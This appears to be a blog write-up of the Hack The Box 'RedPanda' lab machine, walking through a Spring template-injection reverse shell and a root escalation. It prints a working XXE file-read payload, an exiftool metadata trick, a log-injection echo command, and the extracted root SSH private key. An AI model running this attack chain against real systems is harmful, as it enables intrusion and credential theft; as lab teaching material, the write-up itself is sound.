---
layout: post
category: writeup
---

## Machine Info

- Name: RedPanda
- Description: RedPanda is an easy Linux machine that features a website with a search engine made using the Java Spring Boot framework. This search engine is vulnerable to Server-Side Template Injection and can be exploited to gain a shell on the box as user `woodenk`. Enumerating the processes running on the system reveals a `Java` program that is being run as a cron job as user `root`. Upon reviewing the source code of this program, we can determine that it is vulnerable to XXE. Elevation of privileges is achieved by exploiting the XXE vulnerability in the cron job to obtain the SSH private key for the `root` user. We can then log in as user `root` over SSH and obtain the root flag.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE SERVICE    VERSION                                                       
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                          
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)            
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)           
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)         
8080/tcp open  http-proxy                                                               
| http-methods:                                                                         
|_  Supported Methods: GET HEAD OPTIONS                                                 
|_http-open-proxy: Proxy might be redirecting requests                    
| fingerprint-strings:                                                                  
|   GetRequest:                                                                         
|     HTTP/1.1 200                                                                      
|     Content-Type: text/html;charset=UTF-8                                             
|     Content-Language: en-US                                                           
|     Date: Mon, 19 Feb 2024 15:53:44 GMT                                               
|     Connection: close                                                                 
|     <!DOCTYPE html>                                                                   
|     <html lang="en" dir="ltr">                                                        
|     <head>                                                                            
|     <meta charset="utf-8">                                                            
|     <meta author="wooden_k">                                                          
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->   
|     <link rel="stylesheet" href="css/panda.css" type="text/css">        
|     <link rel="stylesheet" href="css/main.css" type="text/css">         
|     <title>Red Panda Search | Made with Spring Boot</title>
```

2 Ports, let's checkout 8080!
We're faced with a panda and a search bar, let's capture the request and send it to repeater:
![](assets/images/2024-02-19-HTB-RedPanda-Writeup-image-1.png)

![](assets/images/2024-02-19-HTB-RedPanda-Writeup-image-2.png)
We know that it's using spring boot! This is also reflecting everything I'm typing to the screen, I can attempt 3 things, SSTI, SQLi, and XSS. SSTI seems the most likely for me so let's look into it 

I use a spring framework SSTi Payload and get the `id` command to run!
![](assets/images/2024-02-19-HTB-RedPanda-Writeup-image-3.png)

From there I can switch it to a reverse shell payload:

```bash
HTB nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.170] 49212
bash: cannot set terminal process group (880): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 
```
## Privilege Escalation

I look for the source code of the application, which seems to be here:
![](assets/images/2024-02-19-HTB-RedPanda-Writeup-image-4.png)

This looks like it takes the artist name from the image directory and then parses out their data from /credits/ directory. This means that the artist tag is vulnerable to LFI into XXE. I'll start by crafting the XXE:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/../../../../../../../dev/shm/greg.jpg</uri>
    <views>&xxe;</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Now I'll craft the image payload:

```bash
exiftool -artist=../../../../dev/shm/woodenk greg.jpg 
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - greg.jpg
    1 image files updated
```

Now I need to write it to /dev/shm along side with the xml file somewhere on the machine so it can reference it. Note that it autocompletes the `_creds.xml`

From there I need to update the redpanda log in order to get it to execute the payload:

```bash
woodenk@redpanda:/opt/panda_search$ echo "200||10.10.14.36||Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/../../../../../../../../../../dev/shm/greg.jpg" > ./redpanda.log
```

Now we wait some time and read the file again, and we'll see that it wrote our payload! From there I can read the ssh key for the root user and ssh in as him!

```bash
woodenk@redpanda:/dev/shm$ cat woodenk_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/../../../../../../../../dev/shm/greg.jpg</uri>
    <views>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```


```bash
root@redpanda:~# whoami
root
```

best,
gerbsec